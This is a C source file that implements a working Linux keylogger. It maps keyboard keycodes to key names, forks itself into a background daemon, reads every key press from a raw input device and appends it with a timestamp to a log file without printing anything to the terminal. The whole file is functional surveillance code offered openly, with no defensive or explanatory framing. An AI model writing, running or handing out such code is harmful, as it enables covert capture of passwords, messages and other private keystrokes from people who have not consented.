#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>
#include <string.h>

// Keycode-to-key mapping for all standard keys
const char* keycode_to_string(int keycode) {
    switch (keycode) {
        case 1: return "Esc";
        case 2: return "1";
        case 3: return "2";
        case 4: return "3";
        case 5: return "4";
        case 6: return "5";
        case 7: return "6";
        case 8: return "7";
        case 9: return "8";
        case 10: return "9";
        case 11: return "0";
        case 12: return "-";
        case 13: return "=";
        case 14: return "Backspace";
        case 15: return "Tab";
        case 16: return "Q";
        case 17: return "W";
        case 18: return "E";
        case 19: return "R";
        case 20: return "T";
        case 21: return "Y";
        case 22: return "U";
        case 23: return "I";
        case 24: return "O";
        case 25: return "P";
        case 26: return "[";
        case 27: return "]";
        case 28: return "Enter";
        case 29: return "Ctrl";
        case 30: return "A";
        case 31: return "S";
        case 32: return "D";
        case 33: return "F";
        case 34: return "G";
        case 35: return "H";
        case 36: return "J";
        case 37: return "K";
        case 38: return "L";
        case 39: return ";";
        case 40: return "'";
        case 41: return "`";
        case 42: return "Shift";
        case 43: return "\\";
        case 44: return "Z";
        case 45: return "X";
        case 46: return "C";
        case 47: return "V";
        case 48: return "B";
        case 49: return "N";
        case 50: return "M";
        case 51: return ",";
        case 52: return ".";
        case 53: return "/";
        case 54: return "Shift";
        case 55: return "Keypad *";
        case 56: return "Alt";
        case 57: return "Space";
        case 58: return "Caps Lock";
        case 59: return "F1";
        case 60: return "F2";
        case 61: return "F3";
        case 62: return "F4";
        case 63: return "F5";
        case 64: return "F6";
        case 65: return "F7";
        case 66: return "F8";
        case 67: return "F9";
        case 68: return "F10";
        case 87: return "Num Lock";
        case 88: return "Scroll Lock";
        case 90: return "Keypad 7";
        case 91: return "Keypad 8";
        case 92: return "Keypad 9";
        case 93: return "Keypad +";
        case 95: return "Keypad 4";
        case 96: return "Keypad 5";
        case 97: return "Keypad 6";
        case 98: return "Keypad 1";
        case 99: return "Keypad 2";
        case 100: return "Keypad 3";
        case 101: return "Keypad 0";
        case 102: return "Keypad .";
        case 104: return "F11";
        case 105: return "F12";
        case 106: return "F13";
        case 107: return "F14";
        case 108: return "F15";
        default: return "Unknown Key";
    }
}

void keylogger(const char *logfile) {
    const char *device = "/dev/input/event2"; // Change this to your keyboard's event file
    struct input_event event;

    pid_t pid = fork();
    if (pid < 0) {
        perror("Error forking process");
        return;
    }
    if (pid > 0) {
        // Parent process exits, allowing child to run in background
        printf("Keylogger running in the background. PID: %d\n", pid);
        return;
    }

    // Child process (daemon)
    setsid();  // Create a new session
    int fd = open(device, O_RDONLY);
    if (fd == -1) {
        perror("Error opening device file");
        printf("Ensure you have the correct permissions or run as root.\n");
        exit(EXIT_FAILURE);
    }

    FILE *log = fopen(logfile, "a");
    if (!log) {
        perror("Error opening log file");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Add a timestamp at the start of the session
    time_t now = time(NULL);
    fprintf(log, "Session started: %s\n", ctime(&now));
    fflush(log);

    // Run the keylogger in the background, without printing anything to the terminal
    while (1) {
        if (read(fd, &event, sizeof(struct input_event)) > 0) {
            if (event.type == EV_KEY && event.value == 1) { // Key press event
                // Map the keycode to the actual key name
                const char* key = keycode_to_string(event.code);

                // Log the key press event to the log file
                fprintf(log, "Key %s pressed at %ld\n", key, time(NULL));
                fflush(log);  // Ensure data is written immediately
            }
        } else {
            // Handle error reading from the device file
            perror("Error reading from device file");
        }
    }

    fclose(log);
    close(fd);
}

